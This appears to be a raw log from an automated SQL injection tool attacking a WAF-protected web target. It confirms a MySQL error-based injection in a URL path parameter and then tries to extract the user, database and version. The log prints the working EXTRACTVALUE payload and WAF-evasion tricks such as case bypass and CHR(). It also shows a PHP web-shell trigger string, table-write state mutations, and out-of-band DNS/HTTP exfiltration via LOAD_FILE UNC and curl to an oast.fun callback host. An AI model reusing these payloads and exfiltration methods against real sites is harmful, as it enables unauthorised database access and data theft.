@@ -1,0 +1,609 @@
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8574)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8575)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8576)
+    [EH-error] [MySQL] req#2739 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8577)
+    [E-error] [MySQL] req#2728 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8578)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8579)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8580)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8581)
+    [EH-error] [MySQL] req#2740 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8582)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8583)
+    [E-error] [MySQL] req#2616 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8584)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8585)
+    [EH-error] [MySQL] req#2741 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8586)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8587)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8588)
+    [E-error] [MySQL] req#2731 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8589)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8590)
+    [EH-error] [MySQL] req#2742 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8591)
+    [E-error] [MySQL] req#2618 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8592)
+    [E-error] [MySQL] req#2732 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8593)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8594)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8595)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8596)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8597)
+    [EH-error] [MySQL] req#2743 err=False status=525  no error
+[*] testing 'MySQL header error-based' (param='path-injection' req#8598)
+    [E-error] [MySQL] req#2620 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8599)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8600)
+    [E-error] [MySQL] req#2737 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8601)
+    [EH-error] [MySQL] req#2744 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8602)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8603)
+    [E-error] [MySQL] req#2621 err=False baseline=False status=525   no error
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8604)
+    [E-error] [MySQL] req#2738 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8605)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8606)
+    [EH-error] [MySQL] req#2745 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8607)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8608)
+    [E-error] [MySQL] req#2739 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8609)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8610)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8611)
+    [EH-error] [MySQL] req#2746 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8612)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8613)
+    [E-error] [MySQL] req#2740 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8614)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8615)
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8616)
+    [EH-error] [MySQL] req#2747 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8617)
+    [E-error] [MySQL] req#2741 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8618)
+    [E-error] [MySQL] req#2625 err=False baseline=False status=525   no error
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8619)
+    [E-error] [MySQL] req#2740 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8620)
+    [EH-error] [MySQL] req#2748 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8621)
+    [E-error] [MySQL] req#2742 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8622)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8623)
+    [E-error] [MySQL] req#2741 err=False baseline=False status=400   no error
+[*] testing 'MySQL AND error-based' (param='path-injection' req#8624)
+    [E-error] [MySQL] req#2743 err=True baseline=False status=403   ERROR (new)
+    [EH-error] [MySQL] req#2749 status=403  WAF-blocked (skipped)
+[*] testing 'MySQL header error-based' (param='path-injection' req#8625)
+[*] testing 'MySQL AND error-based' (param='X-Forwarded-For' req#8626)
+[*]     E multi-probe 2/6:  error found (2/2 needed)
+[*]     E clean probe (false-condition): error absent  confirmed
+[?] 'path-injection' candidate (pre-PCV): [MySQL AND error-based] — awaiting PCV confirmation
+[!!] SQL INJECTION CONFIRMED [E] MySQL (pre-verified  early escalation before scan-stop gate) — starting extraction
+[+]  Payload  :  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[*] [MultiVote] Param 'path-injection' voted confidence: 100% (votes: {'E': 1.0})
+[+] Vulnerability confirmed  param='path-injection' technique=E dbms=MySQL
+
+[!!] SQL INJECTION CONFIRMED  [E] MySQL  param='path-injection'
+[+] Technique : E  DBMS: MySQL  Param: 'path-injection'
+[+] Payload   :  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))
+[+] Requests  : 8626
+
+[!!] SQL injection confirmed!
+    Parameter : 'path-injection'
+    URL       : /*
+    Technique : E
+    DBMS      : MySQL
+    Bypass    : waf_encoding_unknown
+    Confidence: 100%
+    Payload   : ' AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))'
+    Requests  : 2745
+
+[+] Injection confirmed  cancelled 3 background tasks immediately
+[*] Injection confirmed on 'path-injection'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='path-injection'
+[*] Extraction started for 'path-injection'
+[+] BG injection confirmed  primary scan cancelled for fast extraction
+[+] Injection confirmed  cancelled remaining background scans
+[*] Collecting background surface results...
+[+] [BGExtraction] Recovered path-injection [E] MySQL from event
+[+] Minimising payload: 47 chars  ?
+[+] [ErrorOracle] Calibrated: status 525 vs 403 (ctx=' AND ' template: IF({cond},(SELECT 1 FROM(SELECT COUNT(*)...)
+[+] [V25-Extract] ConditionalErrorOracle calibrated for 'path-injection'
+[+] DBMS: MySQL (from detection, skipping fingerprint)
+[+] DBMS: MySQL  (conf=100%)
+[*] [MultiVector] Probing extraction methods for MySQL...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [ErrorExtract] Error-based detection - using conditional error extraction
+[+] [ErrorExtract] DBMS: MySQL
+[+] [ErrorExtract] Using metadata - prefix='' suffix='-- -' (validated)
+[+] [ErrorExtract] Testing error message visibility...
+[!] [ErrorExtract] Primary error template failed
+[+] [ErrorExtract] Unobfuscated probe blocked — retrying with obfuscated probe...
+[!] [ErrorExtract] ✗ Error messages filtered/suppressed by WAF
+[!] [ErrorExtract] Error visibility confirmed failed (both plain and obfuscated probes) — aborting error-based extraction to prevent garbage output
+[+] [ErrorExtract] No data extracted via error messages
+[+] [ErrorExtract] Attempting error oracle direct extraction fallback...
+[+] [ErrorExtract] Error oracle available — extracting via ConditionalErrorExtractor
+[+] Minimised: 47  46 chars (7 probes)
+[+]  'path-injection': E [WHERE_STRING] bypass=waf_encoding_unknown conf=100%
+[+] [PATCH-5] Second injection point param='path-injection' technique=E dbms=MySQL — logging only, already recorded (Req 5).
+[!] [ExtractionGuard] Extraction already running on 'path-injection@MySQL@POST'  blocking parallel extraction of 'path-injection' (Issue 5 fix: never two extractions)
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete before exiting...
+[+] [ErrorExtract] Error oracle version: ?
+[+] [ErrorExtract] version: ?
+[+] [ErrorExtract] Error oracle user: ?
+[+] [ErrorExtract] user: ?
+[+] [ErrorExtract] Error oracle database: ?
+[+] [ErrorExtract] database: ?
+[+] [ErrorExtract] Falling back to standard extraction methods...
+[+] [Inference] Detection payload: AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))
+[+] [Inference] DBMS: MySQL | Tamper chain: ['hex_entities']
+[+] [Inference] Template (boolean-append): AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE())) AND [INFERENCE]
+[+] [Inference] PATH injection: stripping URL-encoding tampers to prevent double-encoding of SQL operators in URL path
+[+] [Inference] No sleep value in detection payload — falling back to 3.0s (from config.time_sec)
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=3.0s)...
+[+] [Inference] Calibration 1: TRUE=471ms FALSE=153ms margin=318ms
+[+] [Inference] Best margin: 318ms
+[+] [Inference]  BOOLEAN ORACLE detected! status 525 vs 403 (attempt 1)
+[+] [Inference]  Threshold=312ms (margin=318ms)
+[+] [Inference] Template confirmed by active boolean oracle  skipping re-test
+[+] [Inference] Error probe: same error status=403 for both probes (body diff skipped — not SQL oracle)
+[+] [Inference] Operator '>' blocked  trying alternatives
+[+] [Inference] All comparison operators blocked  using BITWISE extraction (& and = only)
+[+] [Inference] Standard extraction empty — trying regex binary search
+[+] [Inference] Standard extraction empty — trying LIKE prefix
+[+] [Inference] BUG7-RETRY: re-running extraction now that all functions are defined (boolean_oracle=True hdr=None margin=318ms bitwise_fallback=True)
+[+] [Inference] r7_user: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[!] [Inference] _get_length_bitwise: equality recovery failed (no candidate matched). Using raw partial value=592. Extraction may be shorter than actual string.
+[!] [Inference] r7_user: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_user: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_user: length=80
+[!] [Inference] r7_user: BITWISE oracle sanity FAILED (RC-1: hex-8 mask=comparison form &8=8 at pos=9999→True). Imperva WAF selectively blocks '&mask=mask' patterns where mask contains hex digit '8'. Actual extraction probes (&8=8, &128=128, &2048=2048, &32768=32768, &524288=524288) will be WAF-blocked producing garbage chars like chr(0x88888). Switching to equality scan.
+[!] [Inference] pos=1 equality: match val=104 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_user: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_user: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=420 (raw bitwise was 292, blocked masks=[8, 128])
+[!] [Inference] r7_user: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_user: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_user: length=80
+[!] [Inference] r7_user: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=77 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_user: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_user: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[!] [Inference] _get_length_bitwise: equality recovery failed (no candidate matched). Using raw partial value=65. Extraction may be shorter than actual string.
+[!] [Inference] r7_user: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_user: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_user: length=80
+[!] [Inference] r7_user: BITWISE oracle sanity FAILED (always-false→True). WAF differentially blocks bitwise SQL conditions containing real query and returns True signal. Switching to equality scan (_fallback_equality) which uses only = operator — WAF-safe.
+[!] [Inference] pos=1 equality: match val=97 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_user: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_user: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=931 (raw bitwise was 803, blocked masks=[8, 128])
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=37 (raw bitwise was 37, blocked masks=[8, 128])
+[+] [Inference] r7_user: bitwise length=80
+[!] [Inference] r7_user: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_user: length=80
+[!] [Inference] r7_user: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=99 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_user: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_user: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=51 (raw bitwise was 51, blocked masks=[8, 128])
+[+] [Inference] r7_user: bitwise length=51
+[+] [Inference] r7_user: length=51
+[!] [Inference] r7_user: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=52 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_user: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_database: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=4 (raw bitwise was 4, blocked masks=[8, 128])
+[!] [Inference] r7_database: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_database: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_database: length=80
+[!] [Inference] r7_database: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=108 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_database: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_database: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: RC-2 cross-complementary sanity detected selective hex-'8' mask WAF blocking (a=True, b=True, boolean_oracle=True, reason=boolean-oracle SQL-impossible (both True)). Blocked masks for 10-bit extraction: [8, 128]. Will recover blocked bits via equality probes.
+[!] [Inference] _get_length_bitwise: equality recovery failed (no candidate matched). Using raw partial value=65. Extraction may be shorter than actual string.
+[!] [Inference] r7_database: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_database: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_database: length=80
+[!] [Inference] r7_database: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=103 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_database: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_database: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[!] [Inference] _get_length_bitwise: equality recovery failed (no candidate matched). Using raw partial value=5. Extraction may be shorter than actual string.
+[!] [Inference] r7_database: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[+] [Inference] r7_database: bitwise length=80 equals max_len and equality probe confirms it is correct (counter-probe correctly False — not WAF garbage)
+[+] [Inference] r7_database: length=80
+[!] [Inference] r7_database: BITWISE oracle sanity FAILED (selective-mask: always-false &8=1→True). WAF selectively blocks bitmask probes containing hex digit '8' in mask value (affected masks: 8, 128, 2048, 32768, 524288). Switching to equality scan.
+[!] [Inference] pos=1 equality: match val=55 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_database: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_database: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=50 (raw bitwise was 50, blocked masks=[8, 128])
+[!] [Inference] r7_database: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_database: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_database: length=80
+[!] [Inference] r7_database: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=103 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_database: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_version: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=220 (raw bitwise was 84, blocked masks=[8, 128])
+[!] [Inference] r7_version: bitwise length all-zero (WAF-blocked?) — falling back to max_len=80
+[!] [Inference] r7_version: bitwise length=80 hit max_len ceiling, equality probe ambiguous (None) — capping to max_len=80
+[+] [Inference] r7_version: length=80
+[!] [Inference] r7_version: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=48 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_version: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] r7_version: all ops blocked — using bitwise length detection directly
+[!] [Inference] _get_length_bitwise: RC-2 cross-complementary sanity detected selective hex-'8' mask WAF blocking (a=None, b=True, boolean_oracle=True, reason=boolean-oracle &8=8 blocked (a=None, b=True)). Blocked masks for 10-bit extraction: [8, 128]. Will recover blocked bits via equality probes.
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=114 (raw bitwise was 114, blocked masks=[8, 128])
+[!] [Inference] _get_length_bitwise: both cross-complementary sanity probes returned None — oracle ambiguous on &8 patterns. Conservatively treating hex-'8' masks as blocked. Blocked masks: [8, 128]
+[+] [Inference] _get_length_bitwise: equality probe confirmed length=262 (raw bitwise was 262, blocked masks=[8, 128])
+[+] [Inference] r7_version: bitwise length=80
+[+] [Inference] r7_version: bitwise length=80 equals max_len and equality probe confirms it is correct (counter-probe correctly False — not WAF garbage)
+[+] [Inference] r7_version: length=80
+[!] [Inference] r7_version: BITWISE oracle sanity UNCERTAIN (RC-1: hex-8 mask=comparison &8=8 at pos=9999→None). WAF selective blocking of '&8=8' form cannot be ruled out. Switching to equality scan to prevent garbage extraction.
+[!] [Inference] pos=1 equality: match val=89 True AND ordinal-0 complement ALSO True — WAF-uniform blocking (blocks even =0); aborting scan (scan-wide).
+[!] [Inference] r7_version: modbit+equality fallback both failed at pos=3, stopping
+[+] [Inference] No usable data extracted via boolean/timing inference
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[!] [SideChannel] MySQL OOB: only LOAD_FILE UNC payloads available and FILE privilege not confirmed by detection — attempting anyway (LOAD_FILE NULL→no DNS callback→silent no-op).
+[+] [SideChannel] Advanced DNS: load_file_unc
+[+] [SideChannel] HTTP exfil: sys_exec_curl
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload (raw/wire):  AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))
+[+] [Direct] Detection payload (decoded): AND EXTRACTVALUE(0x0a,CONCAT(0x7e,DATABASE()))
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel-1] Testing WAF trigger 3/7: <img src=x onerror=alert(1)>...
+[+] [Novel-1] Testing WAF trigger 4/7: javascript:alert(1)...
+[+] [Novel-1] Testing WAF trigger 5/7: UNION SELECT FROM...
+[+] [Novel-1] Testing WAF trigger 6/7: <?php system($_GET['c']); ?>...
+[+] [Novel]  WAF trigger #5 works: TRUE403 FALSE525
+[+] [Novel]  PATH injection surface: running oracle cross-validation (CDN cache interference check)
+[+] [Novel]  WAF weaponization oracle FAILED cross-validation (1/3 pairs discriminated) — CDN cache interference likely on PATH injection surface; skipping
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing not viable (noise too high)
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=2ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'load_file_dns' fired for user  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'into_outfile' fired for user  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'load_file_dns' fired for database  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'into_outfile' fired for database  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'load_file_dns' fired for version  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] DNS vector 'into_outfile' fired for version  check jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 403
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <!DOCTYPE html>
+<html>
+
+<head>
+  <title></title>
+  <link href="/favicon.ico" rel="icon" type="image/
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  No error type produces different response
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'user_var' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'user_var' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'user_var' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation not viable (WAF blocked: inflated_sc=403 normal_sc=403)
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle not viable (margin=9ms)
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] DNS OOB: VERSION()  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   load_file: LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval
+[SideChannel]     status=525 (434ms) 
+[SideChannel]   load_file_alt: LOAD_FILE alt UNC — distinct WAF fingerprint
+[SideChannel]     status=400 (106ms) (rejected/bad-request)
+[SideChannel]   load_file_mx1: LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion
+[SideChannel]     status=400 (273ms) (rejected/bad-request)
+[SideChannel]   load_file_mx2: LOAD_file WAF case-bypass — alternate case pattern
+[SideChannel]     status=525 (469ms) 
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: database()  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   load_file: LOAD_FILE UNC LOWER(HEX) — DNS side-effect fires on eval
+[SideChannel]     status=403 (174ms) (WAF-blocked)
+[SideChannel]   load_file_alt: LOAD_FILE alt UNC — distinct WAF fingerprint
+[SideChannel]     status=403 (172ms) (WAF-blocked)
+[SideChannel]   load_file_mx1: LoAd_FiLe WAF case-bypass — case-sensitive WAF evasion
+[SideChannel]     status=403 (153ms) (WAF-blocked)
+[SideChannel]   load_file_mx2: LOAD_file WAF case-bypass — alternate case pattern
+[SideChannel]     status=403 (204ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (2 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_user()  jusiwhiuoclaegcwaaovby6pnq3y1bjy7.oast.fun
+[SideChannel] Sending 4 OOB methods...
